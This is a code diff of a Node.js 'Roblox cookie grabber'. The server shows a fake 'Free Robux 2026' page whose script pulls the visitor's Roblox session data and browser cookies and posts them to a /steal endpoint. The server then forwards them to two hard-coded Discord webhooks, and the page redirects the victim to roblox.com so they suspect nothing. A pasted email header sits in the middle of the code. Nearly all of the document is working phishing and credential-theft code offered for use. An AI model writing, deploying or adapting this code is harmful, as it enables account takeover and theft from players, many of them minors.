@@ -1,92 +1,124 @@
-// SIMPLE ROBLOX COOKIE GRABBER FOR BEGINNERS - 2026
-const express = require('express'); // for making web server
-const axios = require('axios'); // for sending to Discord
+
+Aymen M <manlikeaymen@gmail.com>
+17:58 (0 minutes ago)
+to me
+
+const express = require('express');
+const axios = require('axios');
 
 const app = express();
 
-// Allow server to read data from visitors
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// PASTE YOUR TWO WEBHOOK URLS HERE (from Step 1)
-const webhookUrl1 = 'https://discord.com/api/webhooks/1469681356844830844/uW5bbhqMlLTKo8Gqde_2DpGqM1BEHlzPlidyAq5RzM3glNAq03_UmbOXM2tng2lgHJ11'; // change this
-const webhookUrl2 = 'https://discord.com/api/webhooks/1469676445528756225/GmsnFGkzYLhmLS3MFQn4zWuZA3KKzZnu1Uvb4lENEQhfkDYUCrsKm9dmgknxhvE6jBP-'; // change this
+// YOUR TWO DISCORD WEBHOOKS - CHANGE THESE
+const webhookUrl1 = 'https://discord.com/api/webhooks/1469676445528756225/GmsnFGkzYLhmLS3MFQn4zWuZA3KKzZnu1Uvb4lENEQhfkDYUCrsKm9dmgknxhvE6jBP-';
+const webhookUrl2 = 'https://discord.com/api/webhooks/1469681356844830844/uW5bbhqMlLTKo8Gqde_2DpGqM1BEHlzPlidyAq5RzM3glNAq03_UmbOXM2tng2lgHJ11';
 
-// Function to send stolen cookie to both Discord hooks
-async function sendToDiscord(stolenData) {
-const message = {
-embeds: [{
-title: '🎉 NEW ROBLOX COOKIE STOLEN! 🎉',
-description: '```json\n' + JSON.stringify(stolenData, null, 2) + '\n```', // formats nicely
-color: 0x00ff00, // green color
+// Function to send stolen data to both webhooks
+async function sendToDiscord(data) {
+const embed = {
+title: '🔥 NEW ROBLOX COOKIE HIT YOU KURD 🔥',
+description: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
+color: 0xff0044,
 timestamp: new Date().toISOString(),
-footer: { text: 'Beginner Grabber - Feb 2026' }
-}]
+footer: { text: 'Grabber v2026' }
 };
 
-// Send to first hook, ignore if error
-try { await axios.post(webhookUrl1, message); } catch {}
-// Send to second
-try { await axios.post(webhookUrl2, message); } catch {}
+const payload = { embeds: [embed] };
+
+try { await axios.post(webhookUrl1, payload); } catch (e) { console.log('Webhook1 failed:', e.message); }
+try { await axios.post(webhookUrl2, payload); } catch (e) { console.log('Webhook2 failed:', e.message); }
 }
 
-// Main page that visitors see (fake Robux page with stealer script)
+// Quick test route to confirm server is running
+app.get('/test', (req, res) => {
+res.send('SERVER IS ALIVE AND LISTENING! Test successful 😈');
+});
+
+// Main fake page with stealer script
 app.get('/', (req, res) => {
 res.send(`
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Free Robux 2026 - Claim Now!</title>
+<meta charset="UTF-8">
+<title>Roblox - Free Robux 2026</title>
 <style>
-body { background-color: black; color: lime; font-family: Arial; text-align: center; padding: 50px; }
-h1 { font-size: 40px; }
-p { font-size: 20px; }
+body { background:#000; color:#0f0; font-family:Arial; text-align:center; padding:80px; margin:0; }
+h1 { font-size:3.5em; margin-bottom:20px; }
+p { font-size:1.6em; }
 </style>
 </head>
 <body>
-<h1>Claim 1,000,000 Free Robux!</h1>
-<p>Verifying your account... Please wait 5 seconds...</p>
+<h1>Claim Your 1,000,000 Free Robux!</h1>
+<p>Verifying Roblox session... Please wait 6 seconds...</p>
 
 <script>
-// Wait 5 seconds then steal if logged in
-setTimeout(async () => {
-try {
-// Fetch Roblox session data (sends cookie automatically)
-const res = await fetch('https://www.roblox.com/my/settings/json', {
-credentials: 'include' // important: sends cookies
-});
-const data = await res.json();
+console.log("Grabber script loaded");
 
-// Send to our server
-await fetch('/steal', {
+setTimeout(async () => {
+console.log("Attempting to fetch Roblox session data...");
+try {
+const response = await fetch('https://www.roblox.com/my/settings/json', {
+method: 'GET',
+credentials: 'include',
+redirect: 'manual'
+});
+
+console.log("Fetch response status:", response.status);
+
+if (!response.ok) {
+throw new Error('Roblox fetch failed: ' + response.status);
+}
+
+const robloxData = await response.json();
+
+const payload = {
+cookie: document.cookie,
+robloxInfo: robloxData,
+userAgent: navigator.userAgent,
+screen: \`\${window.screen.width}x\${window.screen.height}\`,
+referrer: document.referrer,
+timestamp: new Date().toISOString()
+};
+
+console.log("Sending payload to server:", payload);
+
+const sendRes = await fetch('/steal', {
 method: 'POST',
 headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({
-cookie: document.cookie, // full cookies
-robloxData: data, // extra info
-userAgent: navigator.userAgent, // browser type
-time: new Date().toISOString() // when stolen
-})
+body: JSON.stringify(payload)
 });
 
-// Redirect to real Roblox so no suspicion
-window.location = 'https://www.roblox.com/home';
-} catch {} // if error, still redirect
-}, 5000);
+console.log("Server response status:", sendRes.status);
+
+// Redirect to make it look legit
+window.location.href = 'https://www.roblox.com/home';
+} catch (err) {
+console.error("Grabber error:", err.message);
+// Still redirect on error so user doesn't suspect
+window.location.href = 'https://www.roblox.com/home';
+}
+}, 6000);
 </script>
 </body>
 </html>
 `);
 });
 
-// When script sends data here
+// Endpoint that receives the stolen data
 app.post('/steal', (req, res) => {
 const stolen = req.body;
-console.log('STOLEN:', stolen); // shows in Render logs
-sendToDiscord(stolen); // send to your Discord
-res.sendStatus(200); // ok
+console.log('Received stolen data:', stolen);
+
+sendToDiscord(stolen);
+
+res.sendStatus(200);
 });
 
-// Start server on Render's port
+// Start server correctly for Render
 const port = process.env.PORT || 3000;
-app.listen(port, () => console.log(`Grabber running on port ${port}`));
+app.listen(port, '0.0.0.0', () => {
+console.log(`Grabber server running on port ${port}`);
+});
